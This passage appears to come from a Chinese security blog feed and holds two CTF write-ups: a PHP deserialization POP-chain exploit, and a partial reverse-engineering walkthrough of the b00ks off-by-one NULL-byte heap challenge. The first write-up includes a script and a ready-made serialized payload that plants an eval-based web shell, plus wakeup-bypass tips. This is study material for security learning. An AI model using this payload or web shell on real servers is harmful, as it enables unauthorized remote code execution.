class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);</span><br><span class="line">      <span class="variable">$id</span>= <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_row</span>(); <span class="variable">$ids</span>[]= <span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$ids</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ids</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="操作过程">操作过程</h3>
<p>1、先找unserialize函数</p>
<p>在class user中有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$oldlyrics</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$oldlyrics</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) <span class="variable">$oldlyrics</span> []= <span class="variable">$lyric</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;lyrics&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$oldlyrics</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;lyrics&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们看到<code>$oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));</code>里面cookie可控</p>
<p>那么问题来了，一个可控的unserialize点意味着什么？</p>
<p><strong>意味着你能控制{当前的定义的类或者自动加载能找到的类}的属性</strong>（这个对象属性当然可以是一个对象）</p>
<p>接着就可以寻找可以搞事的魔术方法，很快就会发现<code>class Lyrics</code>中有两个魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$this</span>-&gt;lyrics) . <span class="string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">log</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们发现两个魔术方法都没有什么敏感的操作，那么这个时候我们可以考虑构造POP链</p>
<p>通读代码可以发现程序员的本意是利用<code>class song</code>的log的方法，但是这个时候我们发现</p>
<p><code>class Logger</code>也有log方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logwriter</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$writer</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logwriter = <span class="variable">$writer</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logwriter-&gt;<span class="title function_ invoke__">writeLog</span>(<span class="variable">$txt</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>更加惊奇的是我们发现一个可以写文件的类这个类中方法<code>writeLog</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$format</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;__&quot;</span>, <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$filename</span>));</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;format = <span class="variable">$format</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="variable language_">$this</span>-&gt;format-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;E:\\WWW\\test\\ctf&quot;</span> . <span class="variable">$this</span>-&gt;filename, <span class="variable">$txt</span>, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>至此一条完整的POP链思路貌似出现在眼前</p>
<p>我们新建一个<code>Lyrics</code>对象将它的song属性填充成<code>Logger</code>对象,再<code>把logger</code>对象的<code>logwriter</code>的属性填充成<code>LogWriter_File</code>对象，最后传送给cookie,在<code>Lyrics</code>对象被销毁的时候就可以触发<code>__destruct()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">OutputFilter</span>(<span class="string">&quot;//&quot;</span>,<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;c&#x27;]);?&gt;&quot;</span>));</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="title class_">LogFileFormat</span>(<span class="variable">$arr</span>,<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> <span class="title class_">LogWriter_File</span>(<span class="string">&quot;shell2333.php&quot;</span>,<span class="variable">$obj1</span>);</span><br><span class="line"><span class="variable">$obj3</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$obj2</span>);</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Lyrics</span>(<span class="string">&quot;2333&quot;</span>,<span class="variable">$obj3</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>)));</span><br></pre></td></tr></table></figure>
<p>serialize.txt可以找到这一坨<br>
<code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A4%3A%222333%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A13%3A%22shell2333.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A26%3A%22%3C%3Fphp+eval%28%24_POST%5B%27c%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D</code></p>
<p>GET一次，即可拿到shell</p>
<h2 id="最后">最后</h2>
<p>记录一下反序列化注意点具体见<a href="http://godot.win/index.php/archives/11/">Godot师傅</a></p>
<p>1、<strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
<p>2、<strong>CTF中成员属性数目前面多一个<code>+</code>可以绕过正则</strong></p>
<p>3、<strong>protect属性和private会产生一些浏览器看不见的字符</strong></p>
<p>4、会很有用的函数 get_included_files() , get_declared_classes()</p>
<p><img src="1.png" alt="1.png"></p>
<p>5、如果通过上面的函数依然没有找到合适的类，可以尝试利用<code>spl_autoload_register</code></p>
<p>6、<a href="http://ph0rse.me/2017/09/27/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E8%B5%B7%E7%9A%84%E6%80%9D%E8%80%83/">session序列化反序列化机制不同造成漏洞</a></p>
<h2 id="最最后">最最后</h2>
<p>无意间在看<a href="http://php.net/manual/zh/migration56.deprecated.php">php文档</a>的时候发现一个5.6.x后废弃的特性，叫做 ，功能是在上下文语境中可以调用用类::的模式调用非静态方法(?)，一个demo如下</p>
<p><img src="2.png" alt="2.png"></p>
<h2 id="最最最后">最最最后</h2>
<p>如有问题请指教</p>
<p>国庆快乐！</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN 堆利用 off-by-one NULL byte - b00ks writeup</title>
    <url>/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/</url>
    <content><![CDATA[<p>最新刚开始学pwn，还不熟悉ida和gdb。此篇记录了off-by-one b00ks上这道题的复现，从ida/gdb使用到payload编写。文中有一些内存分布图片偷懒我没有自己画，引用自<a href="https://blog.csdn.net/qq_48466156/article/details/139691096">这篇文章</a>（写的很好）。侵删。</p>
<!-- more -->
<h2 id="基本信息检查">基本信息检查</h2>
<p><img src="image1.png" alt=""></p>
<p><img src="image2.png" alt=""></p>
<h2 id="程序入口点分析">程序入口点分析</h2>
<p>静态方法拿到程序入口</p>
<p><img src="image3.png" alt=""></p>
<p>动态方法</p>
<p><code>start</code></p>
<ul>
<li>功能：<code>start</code>命令用于加载程序并在程序的 <code>main</code> 函数的第一条语句之前设置一个临时断点。代码会执行到 <code>main</code> 函数启动之前，然后暂停，让你可以进行调试设置。</li>
<li>典型场景：<code>start</code>命令通常用于希望程序在还没有开始主要逻辑之前能暂停下来，让调试者有机会设置其他断点或检查初始状态。</li>
</ul>
<p><img src="image4.png" alt=""></p>
<p><img src="image5.png" alt=""></p>
<h2 id="入口指令恢复">入口指令恢复</h2>
<p><img src="image6.png" alt=""></p>
<p><img src="image7.png" alt=""></p>
<p>这里看到IDA有一个错误的反编译，它把代码搞成了数据，选中这一段用 <code>Undefine</code>（快捷键 <code>U</code>），它会取消对该区域的数据显示。</p>
<p><img src="image8.png" alt=""></p>
<p>在取消定义后，右键点击同一区域。选择 <code>Code</code>（快捷键 <code>C</code>），这将告诉 IDA Pro 重新识别该区域为代码。</p>
<p>右键点击选择 <code>Code</code> 或按 <code>C</code> 键，选force，重新将选中的区域转换为代码。</p>
<p><img src="image9.png" alt=""></p>
<h2 id="确定main函数">确定main函数</h2>
<p>根据LIBC_START_MAIN的函数原型我们可以知道，第一个参数是main函数的地址 -&gt; cs:11CFh</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 ./csu/libc-start.c</span></span><br><span class="line">STATIC <span class="type">int</span> <span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **</span></span><br><span class="line"><span class="params">           MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">          <span class="type">int</span> argc,</span></span><br><span class="line"><span class="params">          <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params">          ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params">          __typeof (main) init,</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">          <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure>
<p><img src="image10.png" alt=""></p>
<p>由此找到main函数</p>
<p>在光标位于 <code>011CF</code> 地址上时，按下快捷键 <code>N</code>，会弹出一个对话框。输入 <code>main</code> 并确认。</p>
<p><img src="image11.png" alt=""></p>
<h2 id="代码阅读与函数名恢复">代码阅读与函数名恢复</h2>
<p><img src="image12.png" alt=""></p>
<h3 id="banner-sub-A77">banner(sub_A77)</h3>
<p>我们一个一个来看，sub_A77输出banner信息，重命名为banner</p>
<p><img src="image13.png" alt=""></p>
<h3 id="edit-author-name-sub-B6D">edit_author_name(sub_B6D)</h3>
<p>需要用户输入author name，重命名为edit_author_name</p>
<p><img src="image14.png" alt=""></p>
<h3 id="create-book-sub-F55">create_book(sub_F55)</h3>
<p>sub_F55是在创建书，重命名为create book</p>
<p><img src="image15.png" alt=""></p>
<h3 id="delete-book-sub-BBD">delete_book(sub_BBD)</h3>
<p>sub_BBD是在删除书，重命名为delete_book</p>
<p><img src="image16.png" alt=""></p>
<h3 id="edit-book-sub-E17">edit_book(sub_E17)</h3>
<p>sub_E17在修改book, edit_book</p>
<p><img src="image17.png" alt=""></p>
<h3 id="list-book-sub-D1F">list_book(sub_D1F)</h3>
<p>在输出所有书籍信息, list_book</p>
<p><img src="image18.png" alt=""></p>
<h3 id="menu-sub-A89">menu(sub_A89)</h3>
<p>sub_A89给出了选项，根据用户不同输出跳转到上面的各个子功能。重命名为menu</p>
<p><img src="image19.png" alt=""></p>
<p>最后main被润色成如下</p>
<p><img src="image20.png" alt=""></p>
<h2 id="细读子功能-create-book">细读子功能 create_book</h2>
<p>用户先输入一个size，然后malloc指定用户输入的size的大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp-24h] [rbp-24h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;v1);</span><br><span class="line">    v4 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_9F5(v4, v1 - <span class="number">1</span>) )</span><br></pre></td></tr></table></figure>
<p>接着调用sub_9F5，让我们细看一下sub_9F5的作用，这里它循环读取用户输入内容并且赋值给刚才malloc的那块内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">sub_9F5</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, v4, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们重名为scan_user_input。举个例子如果用户输入32, 那么就会调用scan_user_input(v4, 31)。scan_user_input内部循环从0读到31并且在第32位添加0，注意这里其实是一个 <em>off</em> -by-<em>one NULL byte</em>问题，用户申请32的空间，实际写入了33个字符。</p>
<p>如果一切回继续进入else部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = sub_B24();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3[<span class="number">6</span>] = v1;</span><br><span class="line">      *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">      *((_QWORD *)v3 + <span class="number">1</span>) = v4;</span><br><span class="line">      *v3 = ++unk_202024;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用sub_B24</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">sub_B24</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( *((_DWORD *)&amp;v1 - <span class="number">1</span>) = <span class="number">0</span>; *((_DWORD *)&amp;v1 - <span class="number">1</span>) &lt;= <span class="number">19</span>; ++*((_DWORD *)&amp;v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)off_202010 + *((<span class="type">signed</span> <span class="type">int</span> *)&amp;v1 - <span class="number">1</span>)) )</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1 - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结合后面*((_QWORD *)off_202010 + v2) = v3分析，off_202010其实是一个数组（书柜）用来放置book对象的指针，循环遍历这个数字，如果数组对应下标为空，那么说明书柜有空位，返回对应下标，否则返回-1（-1的反码为0xFFFFFFFFLL）把sub_B24命名为check_space。</p>
<p>一旦有space就会给book对象malloc一个空间，稍微美化一下，容易看出在源码中book应该是一个结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">book = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">  book[<span class="number">6</span>] = desc_size;</span><br><span class="line">  *((_QWORD *)bookshelf + idx) = book;</span><br><span class="line">  *((_QWORD *)book + <span class="number">2</span>) = book_desc;</span><br><span class="line">  *((_QWORD *)book + <span class="number">1</span>) = book_name;</span><br><span class="line">  *book = ++unk_202024;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>不过这里反编译的仍然很混乱，unk_202024应该是一个int, book + 1, book + 2应该是两个8字节的指针，为什么放size的时候突然发到book[6]了？book这里一个item的大小究竟是多少？</p>
<p>我们回到这部分汇编再看一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000010F</span>A</span><br><span class="line">.text:<span class="number">00000000000010F</span>A loc_10FA:                               ; CODE XREF: create_book+<span class="number">18</span>D↑j</span><br><span class="line">.text:<span class="number">00000000000010F</span>A                 mov     edi, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>  ; size</span><br><span class="line">.text:<span class="number">00000000000010F</span>F                 call    _malloc</span><br><span class="line">.text:<span class="number">0000000000001104</span>                 mov     [rbp<span class="number">-18</span>h], rax</span><br><span class="line">.text:<span class="number">0000000000001108</span>                 cmp     qword ptr [rbp<span class="number">-18</span>h], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000110</span>D                 jnz     <span class="type">short</span> loc_1122</span><br><span class="line">.text:<span class="number">000000000000110F</span>                 lea     rdi, large cs:<span class="number">1618</span>h ; <span class="string">&quot;Unable to allocate book struct&quot;</span></span><br><span class="line">.text:<span class="number">0000000000001116</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000000111B</span>                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000001120</span>                 jmp     <span class="type">short</span> loc_118F</span><br><span class="line">.text:<span class="number">0000000000001122</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: create_book+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp<span class="number">-20</span>h]      <span class="comment">//这里里面放的是desc size的值</span></span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx     <span class="comment">//把edx赋值给book对象的第一个值，这个值是一个4字节的值</span></span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, bookshelf     <span class="comment">//把存放bookshelf数组地址的那个地址传入</span></span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]         <span class="comment">//拿到bookshelf数组的起始地址</span></span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp<span class="number">-1</span>Ch]     <span class="comment">//把idx放到edx里面</span></span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx           <span class="comment">//把idx字节的值保留符号扩展到8字节</span></span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span>             <span class="comment">//把idx右移动3位相当于idx * 8 -&gt; 移动到指针的距离</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax           <span class="comment">//rdx = bookshelf + idx * 8</span></span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax         <span class="comment">//[bookshelf + idx * 8] = book地址</span></span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax = book地址</span></span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp<span class="number">-8</span>]       <span class="comment">//这里放的是desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx     <span class="comment">//[book+0x10] = desc指针</span></span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp<span class="number">-18</span>h]     <span class="comment">//rax放置book对象指针地址</span></span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp<span class="number">-10</span>h]     <span class="comment">//[rbp-10h]的值name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx       <span class="comment">//[book + 0x8] = name的指针</span></span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]          <span class="comment">// eax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]        <span class="comment">// edx = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024     <span class="comment">// rax = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx          <span class="comment">// [unk_202024] = [unk_202024] + 1</span></span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024     <span class="comment">// rax = unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]          <span class="comment">// edx = [unk_202024]</span></span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp<span class="number">-18</span>h]      <span class="comment">// rax = book</span></span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx          <span class="comment">//*book = 4字节宽度的 unk_202024</span></span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span>             </span><br><span class="line">.text:<span class="number">000000000000118</span>D                 jmp     <span class="type">short</span> locret_11CD</span><br><span class="line">.text:<span class="number">000000000000118F</span> ; ----------------------------------------</span><br></pre></td></tr></table></figure>
<p>综上</p>
